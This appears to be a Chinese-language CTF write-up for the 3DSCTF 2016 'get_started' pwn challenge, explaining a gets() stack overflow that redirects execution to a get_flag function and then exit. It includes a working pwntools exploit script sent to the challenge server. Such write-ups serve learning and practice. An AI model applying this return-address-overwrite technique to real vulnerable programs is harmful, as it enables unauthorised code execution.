---
layout: mypost
title: 3DSCTF 2016 get_started
categories:
  - Pwn
extMath: false
---
_最新修改于  2026-11-22 17:44:02_

在main处可以看到输入部分
![](https://img.h1kari.cn/blog/images/5fe314d2a418f8197dd8fab9ec7131f4b2e26eadc8e2d240a27eb6aa49678812.webp)

查看main的栈帧可知 只需要利用gets填充满var_38即可修改__return_address
![](https://img.h1kari.cn/blog/images/1550f6576d1af0262548c59ca3aa96dc2d462d2ca669748dd54f2a27746f3095.webp)

接着能在0x080489A0找到目标函数get_flag
![](https://img.h1kari.cn/blog/images/9f247a0d9bd6247b3768800b1d4bc8ad47affadfbe682332dcf595e644dfb0f3.webp)

此函数有三个难点：
  - a1 a2的传入
  - a1 a2特定值的大端转小端
  - putchar会将值保存到缓冲区，因此还需要将get_flag的__return_address设为exit

在左侧函数表可以找到exit是0x0804E6A0，随后即可得到flag
![](https://img.h1kari.cn/blog/images/8ba2f9d13f87ce483eddc1e5fd6f73f7ffcbbb32d99c90a32ba9ee89d3846d45.webp)

## EXP
```python
from pwn import *

context.arch = "i386"

payload  = b"A" * 56
payload += p32(0x080489A0)
payload += p32(0x0804E6A0)
payload += struct.pack('<I', 814536271)
payload += struct.pack('<I', 425138641)

io = remote("fb1f985b5b12b4239709716f.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="fb1f985b5b12b4239709716f.tcp-ctf2.dasctf.com")

io.sendline(payload)
io.interactive()

```